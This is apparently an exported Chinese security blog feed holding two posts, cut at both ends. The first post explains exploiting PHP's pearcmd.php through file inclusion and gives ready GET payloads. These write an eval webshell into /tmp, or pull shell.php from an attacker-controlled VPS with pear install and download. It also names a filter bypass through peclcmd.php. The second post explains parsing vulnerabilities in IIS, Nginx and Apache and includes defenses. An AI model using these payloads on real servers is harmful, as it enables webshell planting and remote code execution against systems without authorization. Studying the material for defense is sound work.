function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pearcmd.php使用readPHPArgv()获取命令行参数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数</p><p>而这样获取参数，与正常获取参数略有不同，可以自行在本地搭建尝试，我搭建时的代码为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数获取参数</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$arguments</span> = <span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line">    <span class="comment">// 输出获取到的参数</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$arguments</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Error: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过尝试，可以得出不同之处：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1.&amp;符无发分割参数，真正能分割参数的是加号</span><br><span class="line"></span><br><span class="line">2.等号无法赋值，而是会直接被传进去当作参数。</span><br></pre></td></tr></table></figure><p>而pear命令实质上就是调用了pearcmd.php，也就是说我们可以利用pear命令的形式来进行漏洞利用</p><p>pear命令有很多：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel <span class="keyword">from</span> its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects <span class="keyword">and</span> authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out <span class="keyword">from</span> the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml <span class="number">1.0</span> to package.xml <span class="number">2.0</span> format</span><br><span class="line">cvsdiff                Run a <span class="string">&quot;cvs diff&quot;</span> <span class="keyword">for</span> all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package <span class="keyword">from</span> the <span class="keyword">default</span> channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line"><span class="keyword">list</span>                   List Installed Packages In The Default Channel</span><br><span class="line"><span class="keyword">list</span>-all               List All Packages</span><br><span class="line"><span class="keyword">list</span>-channels          List Available Channels</span><br><span class="line"><span class="keyword">list</span>-files             List Files In Installed Package</span><br><span class="line"><span class="keyword">list</span>-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects <span class="keyword">and</span> authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out <span class="keyword">from</span> the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file <span class="keyword">from</span> a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-<span class="keyword">list</span>            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h5 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h5><p>这个方法有两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">config-create: must have 2 parameters, root path and filename to save as</span><br></pre></td></tr></table></figure><p>利用payload：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=phpinfo()?&gt;+/tmp/test.php </span><br></pre></td></tr></table></figure><p>则数据包为：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.162:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p> 发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>，这里写入文件的内容应该是<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;</code>一整句话，另外，直接写入<code>&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>可能会在输出的时候重复输出很多次，可以多加一个die：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt;</span><br></pre></td></tr></table></figure><p>成功写入文件后，利用文件包含漏洞包含该文件即可实现getshell</p><h5 id="install"><a href="#install" class="headerlink" title="install"></a>install</h5><p>除了上面的方法我们还可以使用install方法：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure><p>这里是在vps上下载test1.php至本网站</p><p>所以，可以从外面将shell文件下载进来然后进行getshell，<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p><p>payload如下</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/shell.php</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?file=/usr/local/lib/php/peclcmd.php&amp;+install+http://vps/shell.php</span><br></pre></td></tr></table></figure><p>不难看出这串payload所下载的文件的保存地址在 &amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;路径下面，这里可能会遇到一些有关配置方面的问题，因为名为&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;的文件夹是新创建的，而用户并没有权限对其进行写操作，会导致利用失败</p><p>但是，除此之外install命令还有另外一种利用的姿势，payload如下：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://[vps]/shell.php</span><br></pre></td></tr></table></figure><h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><p>这个比上面install舒服点，这个直接下载到web目录了，不用提前知道web目录具体路径</p><p>先看用法：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pear download [option] [package]</span><br><span class="line">这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包</span><br></pre></td></tr></table></figure><p>这里可以这样使用：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pear download http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure><p>所以payload可以构造为：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?file=/usr/local/lib/php/peclcmd.php&amp;+download+http://vps/1.php</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?+download+file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php&amp;</span><br></pre></td></tr></table></figure><h3 id="对payload构造的思考"><a href="#对payload构造的思考" class="headerlink" title="对payload构造的思考"></a>对payload构造的思考</h3><p>不难发现每个方法的payload都有两种构造方法，这其中有什么值得研究的呢？</p><p>首先看这个payload：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>这个payload最终存储在$argv中的数组格式为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; [<span class="number">1</span>] =&gt; config-create [<span class="number">2</span>] =&gt; /&amp;file=/usr/local/lib/php/pearcmd.php&amp;/%<span class="number">3</span>C?=<span class="title function_ invoke__">phpinfo</span>()?%<span class="number">3</span>E [<span class="number">3</span>] =&gt; /tmp/hello.php )</span><br></pre></td></tr></table></figure><p>可以看见在config-create前面存在一个加号，这使得数组的第一个键为空，经验证，去掉这个加号后，payload就失效了，这里引发了笔者思考：为何要加这个空键呢？</p><p>事实上，在pearcmd.php中，在分析存储$_SERVER[‘argv’]所有参数的数组$argv时，直接对argv[1]进行分析而不是argv[0]（在本文第一个代码块中可以看见）</p><p>笔者认为，这里对payload进行构造时，重点在于将要调用的pear命令控制在数组的第二位，而剩下两个参数遵循当前pear命令的先后放入数组即可（对比本文所有payload均遵循这个构造原则）</p><p>观点仅代表个人，欢迎斧正（本人技术不够）</p><h3 id="被ban？"><a href="#被ban？" class="headerlink" title="被ban？"></a>被ban？</h3><p>如果pearcmd关键词被ban，可以用peclcmd.php作为平替，在这个php文件当中其实就是引入了pearcmd.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;/www/server/php/52/lib/php&#x27;</span> != <span class="string">&#x27;@&#x27;</span>.<span class="string">&#x27;include_path&#x27;</span>.<span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;include_path&#x27;</span>, <span class="string">&#x27;/www/server/php/52/lib/php&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span></span><br><span class="line">    <span class="variable">$raw</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="string">&#x27;pecl&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;pearcmd.php&#x27;</span>;<span class="comment">//这里包含了pearcmd.php</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解析漏洞</title>
      <link href="/2024/03/26/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/26/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>拜读了d09gy老师的文章，记录一下笔记</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><strong>”服务器对脚本资源的理解差异，决定了服务器自身的安全性。“</strong></p><p>解析漏洞是由于Web Server自身缺陷或者其相关配置存在缺陷导致服务器在解析网站资源文件时，出现的<strong>与所应当解析成的资源类型不一致</strong>的一类安全问题</p><p>这个所谓的<strong>不一致</strong>主要体现在错误地将”普通“文件当作脚本文件解析，导致服务器解析一些被精心构造的恶意文件，导致代码执行或被获取webshell</p><ul><li>这里记录一下较为经典的解析漏洞</li></ul><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><h5 id="文件夹解析漏洞"><a href="#文件夹解析漏洞" class="headerlink" title="文件夹解析漏洞"></a>文件夹解析漏洞</h5><ul><li><p>影响版本</p><p>IIS 5.x 和6.0 </p></li><li><p>漏洞内容</p><p>对于目录中名称为x.asp中的任何文件，包括其他类型的文件比如1.jpg，都会被当作ASP文件解析</p><p>在早期，很多网站的通用编辑器都是可以让用户自己去创建目录，利用编辑器创建example.asp文件夹，内置一个含有恶意asp代码的a.jpg文件，而ASP网站必然启用了ASP解析功能，那么这个a.jpg就会被当作ASP解析成功</p></li><li><p>思考</p><p>这里并不是利用了单一的漏洞点，<strong>文件夹解析漏洞</strong>和<strong>网站允许创建恶意文件夹</strong>这两个致命点缺一不可</p></li></ul><h5 id="分号截断漏洞"><a href="#分号截断漏洞" class="headerlink" title="分号截断漏洞"></a>分号截断漏洞</h5><ul><li><p>影响版本</p><p>IIS6.0</p></li><li><p>漏洞内容</p><p>IIS会将<code>1.asp;.jpg</code>这样的文件当作asp文件解析，在计算机对文件扩展名的理解上说，文件扩展名是以最后一个”.“后面的内容为依据，所以这个文件会被网站过滤程序理解成图片，但IIS会认为分号就是结尾，后面的内容被截断了，所以当作asp文件解析</p></li><li><p>思考</p><p>这种情况下，即使网站使用白名单判断上传的文件类型，只允许jpg文件，攻击者仍然可以实现攻击</p></li></ul><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>漏洞均为服务器本身缺陷所致，最佳方法即为升级IIS、打补丁</p><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h5 id="文件类型错误解析漏洞"><a href="#文件类型错误解析漏洞" class="headerlink" title="文件类型错误解析漏洞"></a>文件类型错误解析漏洞</h5><ul><li><p>配置</p><p>Nginx会将用户请求的HTTP数据包解析成CGI环境变量，通过FastCGI协议发送给PHP-FPM的9000端口；PHP-FPM通过这些CGI环境变量，定义到用户需要执行的php文件并执行，将返回结果通过FastCGI协议的返回包返回给Nginx服务器</p><p>Nginx文件解析漏洞的产生原因是由于Nginx配置文件default.conf以及PHP配置文件php.ini的错误配置。</p><p>引发该漏洞的错误配置分别如下：</p><ul><li><p>Nginx 在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf文件下，有如下配置</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">fastcgi_index index.php<span class="comment">;</span></span><br><span class="line">include fastcgi_params<span class="comment">;</span></span><br><span class="line">fastcgi_params  REDIRECT_STATUS   200<span class="comment">;</span></span><br><span class="line">fastcgi_params  SCRIPT_FILENAME $DOCUMENT_ROOT/$fastcgi_script_name<span class="comment">;</span></span><br><span class="line">fastcgi_params  DOCUMENT_ROOT  /var/www/html<span class="comment">;</span></span><br><span class="line">fastcgi_pass  php:9000<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中引发Nginx文件解析漏洞的不正确配置，就包括</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastcgi_params  SCRIPT_FILENAME <span class="variable">$DOCUMENT_ROOT</span>/<span class="variable">$fastcgi_script_name</span></span><br></pre></td></tr></table></figure><p>这一行配置意为：CGI环境变量<strong>SCRIPT_FILENAME</strong>的值是由**$DOCUMENT_ROOT<strong>和</strong>$fastcgi_script_name<strong>二者拼接而来，</strong>$DOCUMENT_ROOT<strong>是web根路径，</strong>$fastcgi_script_name**是HTTP请求的URI</p><p>举个例子，请求&#x2F;index.php的时候，**$DOCUMENT_ROOT<strong>的值就是&#x2F;var&#x2F;www&#x2F;html，</strong>$fastcgi_script_name<strong>的值就是&#x2F;index.php,所以</strong>SCRIPT_FILENAME**的值为&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php，当PHP-FPM获取到这个变量，就会去执行&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php文件，并返回结果</p><p>而**location ~ \.php$**这一行会将path与.php进行正则匹配，匹配成功才会允许将数据发送给PHP-FPM</p></li><li><p><strong>PATH_INFO</strong>是CGI端口CGI_RFC中定义的一个数据，是指PATH中去除SCRIPT_NAME后剩余的部分，比如请求”&#x2F;index.php&#x2F;yu&#x2F;y0ung“，“&#x2F;index.php”是SCRIPT_NAME，&#x2F;yu&#x2F;y0ung是PATH_INFO，正常情况下，Nginx应该使用fastcgi_split_path_info指令将PATH分割成**$fastcgi_script_name<strong>和</strong>$fastcgi_path_info<strong>，但默认Nginx是不对此进行分割的，所以最后发送给PHP-FPM的是一个包含PATH_INFO的</strong>SCRIPT_FILENAME**，就比如&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#x2F;yu&#x2F;y0ung，这个路径在服务器上是不存在的，所以会报出相应错误</p><p>为了解决这种情况，PHP 在PHP的配置文件php.ini中，有<strong>cgi.fix_pathinfo变量</strong>，默认值为1，表示开启。该变量会对文件路径进行美化，当<strong>SCRIPT_FILENAME</strong>指向的文件不存在时，会去掉路径最后一个”&#x2F;“及其后面的所有内容，举个例子，如果文件的上层路径为&#x2F;index.php&#x2F;yu&#x2F;y0ung；当启用cgi.fix_pathinfo时，php检测到 “y0ung” 文件并不存在，则会向上寻找存在的文件，最终会找到index.php文件</p><p>可以利用这一特性，请求”&#x2F;example.gif&#x2F;.php“，此时PATH以.php结尾，通过了正则匹配，构造出了<strong>SCRIPT_FILENAME</strong>：&#x2F;var&#x2F;www&#x2F;html&#x2F;example.gif&#x2F;.php，PHP-FPM收到请求后，发现文件不存在，就会向前寻找，发现&#x2F;var&#x2F;www&#x2F;html&#x2F;example.gif文件存在，则会将其当作php文件执行</p></li><li><p>当然，如若要实现上述将example.gif文件当作 .php的操作，还离不开 <strong>security.limit_extensions</strong> 属性的设置，该属性位于&#x2F;etc&#x2F;php-fpm.d&#x2F;<a href="http://www.conf目录下,其作用是设置可以被当作php文件解析的文件后缀,如/">www.conf目录下，其作用是设置可以被当作php文件解析的文件后缀，如</a> <strong>security.limit_extensions .png .php</strong> 就代表着只有.png 和 . php结尾的文件才能被当作php文件执行。所以，实现Nginx文件解析漏洞的必要因素之一就是要把 <strong>security.limit_extensions</strong> 属性的属性值设为空，这才能让我们上述中的example.gif 文件被当成 .php文件执行</p></li></ul></li><li><p>思考</p><p>该漏洞的本质是Nginx和PHP对PATH_INFO处理的差异，以及对网站配置上的一些失误导致的</p></li></ul><h5 id="空字节解析漏洞"><a href="#空字节解析漏洞" class="headerlink" title="空字节解析漏洞"></a>空字节解析漏洞</h5><ul><li><p>影响版本</p><ul><li>0.8.41~1.4.3</li><li>1.5.0~1.5.7</li></ul></li><li><p>详情</p><p>如果Nginx配置文件的location中限制了解析文件类型：<code>location ~ \.php$</code>，如此，在正常情况下，只有php扩展名文件才能被发给FastCGI解析，但存在<strong>CVE-2013-4547</strong>漏洞的情况下，可以造成解析漏洞：</p><p>请求<code>phpinfo.jpg[0x20][0x00].php</code>，这个URI可以通过location的正则匹配，但进入后，FastCGI在查找文件时被\0截断了，Nginx会错误地认为请求文件为phpinfo.jpg[0x20]，并将其设置为<strong>SCRIPT_FILENAME</strong>的值发送给FastCGI，造成解析漏洞</p></li><li><p>利用</p><p>如果网站有文件上传点，但不允许php扩展名文件上传，可以尝试上传名为phpinfo.jpg[0x20]的文件（[0x20] 表示空格），再利用解析漏洞解析该文件</p><p>值得一提的是，这里修改文件名的空字节需要使用burp抓包在hex模式下修改请求文件名的字符编码</p></li></ul><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><p>Nginx解析漏洞的表现形式就是任意文件都可以让php解释器执行，可以在目标站点中找一个静态文件，这里以robots.txt为例，利用bp查看请求包和响应包:</p><p>正常情况下，请求&#x2F;robots.txt时，响应包的Content-Type是text&#x2F;plain</p><p>如果请求&#x2F;robots.txt&#x2F;.php时，响应头字段变为php默认的text&#x2F;html，并且增加了php的指纹X-Powered-By，则证明存在解析漏洞</p><p>此时，攻击者便可以上传webshell进行漏洞利用了</p><h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><ul><li><p>文件类型错误解析</p><ul><li><p>文件类型错误解析漏洞是PATH_INFO变量导致的，在不影响业务的情况下，可以在php.ini中关闭fix_pathinfo</p></li><li><p>PHP-FPM中新增了一个安全配置security.limit_extensions,通过设置其值，可以限制PHP-FPM执行的php文件的扩展名，将其值设置为”.php“，其他扩展名的文件就不会再作为php运行：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">security.limit_extensions</span> = .php</span><br></pre></td></tr></table></figure></li><li><p>如果无法修改PHP的配置文件，也可以在Nginx的配置文件中增加如下选项：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">fastcgi_split_path_info^(.+\.php)(.*)$<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>再此情况下，Nginx会按照正则表达式<code>^(.+\.php)(.*)$;</code>对PATH进行分割，匹配到的第一项作为”$fastcgi_script_name“，第二项作为”$fastcgi_path_info“</p></li></ul></li><li><p>空字节解析</p><p>升级Nginx版本</p></li></ul><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>通常指多扩展名导致执行任意代码的漏洞，主要由错误配置导致</p><h5 id="多后缀解析漏洞"><a href="#多后缀解析漏洞" class="headerlink" title="多后缀解析漏洞"></a>多后缀解析漏洞</h5><p>在apache的配置文件里，有一个配置选项为<strong>AddHandler</strong>：在用户请求某扩展名的文件时，使用某处理器处理</p><p><strong>AddHandler</strong>是Apache与PHP能够正常运行的核心，只有设置了“AddHandler application&#x2F;x-http-php.php”，Apache才会将“.php”为扩展名的文件交给处理器“application&#x2F;x-http-php.php ”来处理</p><p>然而<strong>AddHandler</strong>指令有以下几个特点：</p><ul><li>文件扩展名是大小写不敏感的</li><li>一个文件允许有多个扩展名，每个扩展名可以有一个处理器</li></ul><p>假如有如下配置：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-http-php.php<span class="comment">#.php 文件类型关联至 PHP 解释器</span></span><br><span class="line">AddHandler cgi-script .cgi<span class="comment">#所有以 .cgi 结尾的文件应当被视为 CGI 脚本并相应地执行</span></span><br></pre></td></tr></table></figure><p>Apache会从左向右寻找所有可以被识别的扩展名，然后以<strong>最后一个</strong>可识别扩展名为准，解析这个文件，在带有上面配置的环境中：</p><ul><li>如果上传了yuyoung.cgi.php，文件将交给application&#x2F;x-http-php.php解析</li><li>如果上传了包含不认识扩展名的文件，比如yuyoung.php.xyz，将以最后一个可识别扩展名为准（即php）来解析该文件</li></ul><p>如果开发者在文件上传的业务部分，使用黑名单校验文件内容，可以使用yuyoung.php.xyz这种黑名单不存在的扩展名绕过校验，并以php解析</p><h5 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h5><ul><li><p>影响版本</p><p>2.4.0-2.4.29</p></li></ul><p>为了应对上面提到的Apache多后缀解析漏洞，很多运维通过<code>&lt;FilesMatch&gt;</code>配置，来限制匹配到的最后一个扩展名</p><p>如下：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;<span class="section">[^.]</span>+\.php$&quot;&gt;</span><br><span class="line">Sethandler application/x-http-php</span><br><span 